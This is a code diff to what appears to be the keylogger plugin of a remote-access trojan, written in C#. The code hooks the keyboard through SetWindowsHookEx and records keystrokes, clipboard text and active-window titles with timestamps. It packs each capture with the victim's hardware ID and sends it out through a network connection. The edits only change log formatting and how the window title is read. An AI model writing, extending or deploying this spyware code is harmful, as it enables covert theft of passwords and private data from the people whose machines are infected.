@@ -53,7 +53,7 @@ namespace Plugin
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                msgpack.ForcePathObject("log").AsString = $"\n###  Clipboard ###\n{Clipboard.GetCurrentText()}\n";
+                msgpack.ForcePathObject("log").AsString = $"\n\r[Clipboard]\n{Clipboard.GetCurrentText()}\n\r";
                 Connection.Send(msgpack.Encode2Bytes());
             }
             base.WndProc(ref m);
@@ -184,11 +184,8 @@ namespace Plugin
                         }
                         else
                         {
-                            sb.Append(Environment.NewLine);
-                            sb.Append(Environment.NewLine);
-                            sb.Append($"###  {GetActiveWindowTitle()} | {DateTime.Now.ToShortTimeString()} ###");
-                            sb.Append(Environment.NewLine);
-                            sb.Append(currentKey);
+                            sb.Append($"\n\r[{DateTime.Now.ToShortTimeString()}] [{GetActiveWindowTitle()}]");
+                            sb.Append($"\n{currentKey}");
                         }
                         MsgPack msgpack = new MsgPack();
                         msgpack.ForcePathObject("Packet").AsString = "keyLogger";
@@ -225,19 +222,20 @@ namespace Plugin
         {
             try
             {
-                IntPtr hwnd = GetForegroundWindow();
-                GetWindowThreadProcessId(hwnd, out uint pid);
-                Process p = Process.GetProcessById((int)pid);
-                string title = p.MainWindowTitle;
-                if (string.IsNullOrWhiteSpace(title))
-                    title = p.ProcessName;
-                CurrentActiveWindowTitle = title;
-                return title;
+                const int nChars = 256;
+                StringBuilder stringBuilder = new StringBuilder(nChars);
+                IntPtr handle = GetForegroundWindow();
+                GetWindowThreadProcessId(handle, out uint pid);
+                if (GetWindowText(handle, stringBuilder, nChars) > 0)
+                {
+                    CurrentActiveWindowTitle = stringBuilder.ToString();
+                    return CurrentActiveWindowTitle;
+                }
             }
             catch (Exception)
             {
-                return "???";
             }
+            return "???";
         }
 
         #region "Hooks & Native Methods"
@@ -249,6 +247,8 @@ namespace Plugin
         private static string CurrentActiveWindowTitle;
 
 
+        [DllImport("user32.dll")]
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
